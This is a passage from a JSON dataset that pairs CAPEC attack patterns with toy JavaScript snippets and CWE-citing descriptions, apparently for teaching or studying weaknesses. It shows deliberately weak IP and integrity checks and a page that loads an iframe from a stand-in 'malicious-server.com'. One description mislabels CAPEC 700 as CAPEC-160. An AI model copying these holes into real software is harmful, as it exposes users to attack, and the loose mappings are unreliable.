        "code_snippet": "const sensitiveData = 'This is sensitive information';\n\n// Simulate cleartext transmission of sensitive data\nfunction transmitData(data) {\n  console.log('Transmitting data: ' + data); // CWE-319: Cleartext Transmission of Sensitive Information\n}\n\n// Simulate improper protection of physical side channels\nfunction emitElectromagneticSignal(data) {\n  // This function represents the unintentional emission of electromagnetic signals\n  // CWE-1300: Improper Protection of Physical Side Channels\n  console.log('Emitting signal for data: ' + data);\n}\n\n// Simulate covert storage channel\nfunction covertStorageChannel(data) {\n  // CWE-515: Covert Storage Channel\n  localStorage.setItem('covertData', data);\n}\n\n// Simulate improper management of sensitive trace data\nfunction storeTraceData(data) {\n  // CWE-1323: Improper Management of Sensitive Trace Data\n  console.log('Storing trace data: ' + data);\n}\n\n// Simulate covert channel\nfunction covertChannel(data) {\n  // CWE-514: Covert Channel\n  console.log('Covertly transmitting data: ' + data);\n}\n\n// Main function to demonstrate the vulnerability\nfunction main() {\n  transmitData(sensitiveData);\n  emitElectromagneticSignal(sensitiveData);\n  covertStorageChannel(sensitiveData);\n  storeTraceData(sensitiveData);\n  covertChannel(sensitiveData);\n}\n\nmain();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Eavesdropping on a Monitor' by simulating various related weaknesses. The `transmitData` function represents the cleartext transmission of sensitive information (CWE-319). The `emitElectromagneticSignal` function simulates the unintentional emission of electromagnetic signals (CWE-1300). The `covertStorageChannel` function demonstrates a covert storage channel (CWE-515). The `storeTraceData` function shows improper management of sensitive trace data (CWE-1323). Finally, the `covertChannel` function represents a covert channel (CWE-514). The `main` function calls these functions to illustrate how sensitive information can be exposed through various channels, embodying the main idea of the CAPEC."
    },
    {
        "capec_id": "700",
        "capec_name": "Network Boundary Bridging",
        "code_snippet": "const net = require('net');\n\nconst trustedNetwork = '192.168.1.0/24';\nconst untrustedNetwork = '10.0.0.0/24';\n\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    // Improper Restriction of Communication Channel to Intended Endpoints (CWE-923)\n    if (isTrustedEndpoint(socket.remoteAddress)) {\n      // Trust Boundary Violation (CWE-501)\n      processData(data);\n    } else {\n      console.log('Untrusted endpoint:', socket.remoteAddress);\n    }\n  });\n});\n\nserver.listen(8080, '0.0.0.0');\n\nfunction isTrustedEndpoint(ip) {\n  // Simplified check for trusted network\n  return ip.startsWith('192.168.1.');\n}\n\nfunction processData(data) {\n  // Improper Enforcement of Message Integrity During Transmission (CWE-924)\n  if (verifyMessageIntegrity(data)) {\n    console.log('Processing data:', data.toString());\n  } else {\n    console.log('Message integrity check failed');\n  }\n}\n\nfunction verifyMessageIntegrity(data) {\n  // Simplified integrity check\n  return data.length > 0;\n}",
        "description": "This JavaScript code snippet sets up a TCP server that listens for incoming connections. It demonstrates several vulnerabilities related to Network Boundary Bridging (CAPEC-160). The server accepts connections from any IP address, but only processes data from endpoints it considers 'trusted' based on a simple IP address check (CWE-923). This check is overly simplistic and can be easily bypassed, leading to a Trust Boundary Violation (CWE-501). Additionally, the code attempts to verify the integrity of the received data, but the integrity check is insufficient (CWE-924), making it possible for an attacker to modify the data during transmission. This code embodies the main idea of Network Boundary Bridging by showing how an adversary could exploit weak access controls and integrity checks to bridge trusted and untrusted networks."
    },
    {
        "capec_id": "701",
        "capec_name": "Browser in the Middle (BiTM)",
        "code_snippet": "const remoteDesktopUrl = 'http://malicious-server.com/remote-desktop';\n\nfunction loadRemoteDesktop() {\n  const iframe = document.createElement('iframe');\n  iframe.src = remoteDesktopUrl;\n  iframe.style.width = '100%';\n  iframe.style.height = '100%';\n  document.body.appendChild(iframe);\n}\n\nwindow.onload = function() {\n  loadRemoteDesktop();\n};",
        "description": "This JavaScript code snippet demonstrates a Browser in the Middle (BiTM) attack. When the victim loads the webpage, an iframe is created and appended to the document body, which loads a remote desktop session from a malicious server. This leverages CWE-830 (Inclusion of Web Functionality from an Untrusted Source) by embedding an iframe from an untrusted domain. The iframe could potentially allow the adversary to control the victim's browser session. The code also implicitly touches on CWE-602 (Client-Side Enforcement of Server-Side Security) as it relies on the client to load and enforce the remote desktop session, which could be exploited by the attacker."
    },
    {
        "capec_id": "702",
        "capec_name": "Exploiting Incorrect Chaining or Granularity of Hardware Debug Components",
        "code_snippet": "class DebugComponent {\n  constructor() {\n    this.debugChain = ['function1', 'function2', 'function3'];\n    this.authorized = false;\n  }\n\n  authorize(user) {\n    // Incorrectly authorizing the entire chain instead of individual functions\n    if (user === 'admin') {\n      this.authorized = true;\n    }\n  }\n\n  accessFunction(func) {\n    if (this.authorized) {\n      console.log(`Accessing ${func}`);\n    } else {\n      console.log('Unauthorized access attempt');\n    }\n  }\n}\n\nconst debugComponent = new DebugComponent();\ndebugComponent.authorize('admin');\ndebugComponent.accessFunction('function1'); // Authorized access\ndebugComponent.accessFunction('function2'); // Authorized access\n\ndebugComponent.authorize('user');\ndebugComponent.accessFunction('function3'); // Unauthorized access attempt",
        "description": "This JavaScript code snippet demonstrates a simplified version of a debug component system where authorization is incorrectly applied to an entire chain of debug functions rather than on a per-function basis. The `DebugComponent` class contains a list of debug functions and an authorization flag. The `authorize` method sets the authorization flag for the entire chain if the user is 'admin'. The `accessFunction` method checks if the user is authorized to access a specific function. This code embodies the main idea of the CAPEC by showing how incorrect chaining or granularity of debug components can lead to unauthorized access to debug functionality. The related CWEs are represented by the lack of proper access control (CWE-1191) and the incorrect handling of debug components (CWE-1296)."
    }
]